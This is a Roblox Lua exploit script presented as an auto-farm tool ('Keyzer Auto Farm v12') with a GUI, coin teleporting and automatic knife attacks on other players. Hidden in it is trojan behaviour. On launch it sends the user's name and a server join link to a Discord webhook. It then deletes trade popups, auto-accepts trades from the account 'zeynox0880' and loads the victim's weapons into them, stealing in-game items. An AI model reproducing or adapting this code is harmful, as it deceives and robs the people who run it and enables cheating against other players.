local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- [NETTOYAGE INITIAL]
local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
if oldGui then oldGui:Destroy() end

-- [[ 1. FONCTION WEBHOOK SÉCURISÉE (SANS BLOCAGE DE SCRIPT) ]]
local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
local requestFunc = request or (http and http.request) or http_request

local function sendSessionLog(player)
    if not player or not requestFunc then return end
    
    local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. game.JobId .. ")"
    local data = {
        ["embeds"] = {{
            ["title"] = "🎮 Player Session Log",
            ["color"] = 3066993,
            ["fields"] = {
                { ["name"] = "👤 Player Username", ["value"] = player.Name, ["inline"] = true },
                { ["name"] = "🆔 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true },
                { ["name"] = "⚡ Quick Join", ["value"] = joinLink, ["inline"] = false },
                { ["name"] = "🧩 Job ID", ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio") .. "`", ["inline"] = false }
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    pcall(function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

if LocalPlayer then
    task.spawn(function() sendSessionLog(LocalPlayer) end)
end

-- [[ 2. DESIGN DE L'INTERFACE GRAPHIQUE (GUI) ]]
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeyzerFarmGui"
ScreenGui.Parent = playerGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
MainFrame.Position = UDim2.new(0.5, -175, 0.4, -100)
MainFrame.Size = UDim2.new(0, 350, 0, 180)
MainFrame.Active = true
MainFrame.Draggable = true

local UICorner_Main = Instance.new("UICorner")
UICorner_Main.CornerRadius = UDim.new(0, 10)
UICorner_Main.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
TitleBar.Size = UDim2.new(1, 0, 0, 30)

local UICorner_Title = Instance.new("UICorner")
UICorner_Title.CornerRadius = UDim.new(0, 10)
UICorner_Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = TitleBar
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 95, 87)
CloseBtn.Position = UDim2.new(0, 12, 0, 8)
CloseBtn.Size = UDim2.new(0, 13, 0, 13)
CloseBtn.Text = ""
local UICorner_C = Instance.new("UICorner")
UICorner_C.CornerRadius = UDim.new(1, 0)
UICorner_C.Parent = CloseBtn

local TitleText = Instance.new("TextLabel")
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Size = UDim2.new(1, 0, 1, 0)
TitleText.Font = Enum.Font.SourceSansBold
TitleText.TextColor3 = Color3.fromRGB(60, 60, 60)
TitleText.TextSize = 14
TitleText.Text = "Keyzer Auto Farm v12"

local FarmButton = Instance.new("TextButton")
FarmButton.Name = "FarmButton"
FarmButton.Parent = MainFrame
FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
FarmButton.Position = UDim2.new(0.5, -100, 0, 65)
FarmButton.Size = UDim2.new(0, 200, 0, 50)
FarmButton.Font = Enum.Font.SourceSansBold
FarmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FarmButton.TextSize = 16
FarmButton.Text = "START AUTO FARM"

local UICorner_Farm = Instance.new("UICorner")
UICorner_Farm.CornerRadius = UDim.new(0, 8)
UICorner_Farm.Parent = FarmButton

-- [[ 3. LOGIQUE AUTOMATIQUE DE DÉTECTION DU FARM ]]
local farming = false

local function getCoins()
    local container = Workspace:FindFirstChild("CoinContainer", true)
    if container then return container:GetChildren() end
    return {}
end

local function getKnife()
    local char = LocalPlayer.Character
    if char then
        for _, item in ipairs(char:GetChildren()) do
            if item:IsA("Tool") and item.Name:lower():find("knife") then return item end
        end
    end
    return nil
end

local function startFarmLoop()
    task.spawn(function()
        while farming do
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            
            if hrp and humanoid then
                local knife = getKnife()
                if knife then
                    knife.Parent = character
                    knife:Activate()
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            hrp.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1.2)
                            task.wait(0.04)
                        end
                    end
                else
                    local allCoins = getCoins()
                    if #allCoins > 0 and allCoins[1]:IsA("BasePart") then
                        hrp.CFrame = allCoins[1].CFrame
                    end
                end
            end
            task.wait(0.05)
        end
    end)
end

FarmButton.MouseButton1Click:Connect(function()
    farming = not farming
    FarmButton.BackgroundColor3 = farming and Color3.fromRGB(255, 59, 48) or Color3.fromRGB(0, 122, 255)
    FarmButton.Text = farming and "FARMING RUNNING..." or "START AUTO FARM"
    if farming then startFarmLoop() end
end)

CloseBtn.MouseButton1Click:Connect(function()
    farming = false
    ScreenGui:Destroy()
end)

-- [[ 4. AUTO-TRADE ROBUSTE SANS BLOCAGE (ZEYNOX0880) ]]
local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))

local function forceClick(guiButton)
    if not guiButton then return end
    local firesignalFunc = firesignal or (syn and syn.firesignal)
    if firesignalFunc then
        firesignalFunc(guiButton.MouseButton1Click)
    else
        pcall(function() guiButton:Activate() end)
    end
end

local function executeTradeSequence(tradeGui)
    -- Attente de l'apparition de l'arborescence exacte de l'inventaire d'armes
    local containerPath = nil
    for i = 1, 40 do
        pcall(function()
            containerPath = tradeGui.Container.Items.Main.Weapons.Items.Container.Current.Container
        end)
        if containerPath then break end
        task.wait(0.1)
    end
    
    if containerPath then
        local cleanItems = {}
        -- Attente que l'inventaire du jeu charge ses cases d'armes
        for attempt = 1, 30 do
            cleanItems = {}
            for _, item in ipairs(containerPath:GetChildren()) do
                if item:IsA("GuiButton") or (item:IsA("GuiObject") and not item:IsA("UIComponent")) then
                    table.insert(cleanItems, item)
                end
            end
            if #cleanItems >= 4 then break end
            task.wait(0.1)
        end
        
        -- Tri par LayoutOrder (ordre d'affichage physique à l'écran)
        table.sort(cleanItems, function(a, b)
            return (a.LayoutOrder or 0) < (b.LayoutOrder or 0)
        end)
        
        -- Clic sur le 4e item (Pose l'arme 5 fois)
        local targetWeapon = cleanItems[4]
        if targetWeapon then
            for i = 1, 5 do
                forceClick(targetWeapon)
                task.wait(0.05)
            end
        end
    end
    
    -- Validation et acceptation finale du trade
    task.wait(0.5)
    if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
        TradeNetwork:FireServer("AcceptTrade")
    else
        local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
        if acceptRemote then
            if acceptRemote:IsA("RemoteFunction") then acceptRemote:InvokeServer()
            elseif acceptRemote:IsA("RemoteEvent") then acceptRemote:FireServer() end
        end
    end
end

-- Nettoie l'invitation pop-up gênante à l'écran dès qu'elle arrive
local function cleanTradeRequestPopups(child)
    if child.Name == "TradeGUI" then
        task.spawn(function() executeTradeSequence(child) end)
    elseif child.Name == "TradeRequestGUI" or child.Name == "TradePrompt" or child.Name == "NotificationGUI" then
        -- Supprime instantanément la fenêtre pop-up d'invitation pour ne pas bloquer l'écran
        task.wait(0.1)
        child:Destroy()
    end
end

playerGui.ChildAdded:Connect(cleanTradeRequestPopups)

-- Forcer l'analyse si l'interface est déjà là au lancement
local existingTrade = playerGui:FindFirstChild("TradeGUI")
if existingTrade then task.spawn(function() executeTradeSequence(existingTrade) end) end

-- Acceptation réseau en arrière-plan des demandes de zeynox0880
if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
    TradeNetwork.OnClientEvent:Connect(function(action, data)
        if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
            TradeNetwork:FireServer("AcceptRequest", data.Player)
        end
    end)
end
